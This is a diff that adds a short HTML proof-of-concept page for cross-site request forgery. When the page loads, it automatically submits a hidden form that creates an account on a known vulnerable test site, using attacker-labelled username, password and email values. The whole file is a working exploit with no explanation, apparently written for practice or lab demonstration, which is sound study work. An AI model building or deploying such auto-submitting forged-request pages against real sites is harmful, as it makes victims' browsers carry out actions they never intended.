@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF PoC</title>
+</head>
+<body onload="document.forms[0].submit()">
+  <h3>CSRF PoC Demo – Auto-submitting Signup</h3>
+  <form action="http://testphp.vulnweb.com/signup.php" method="POST">
+    <input type="hidden" name="username" value="csrf_attacker">
+    <input type="hidden" name="password" value="12345678">
+    <input type="hidden" name="email" value="hacked@example.com">
+  </form>
+</body>
+</html>
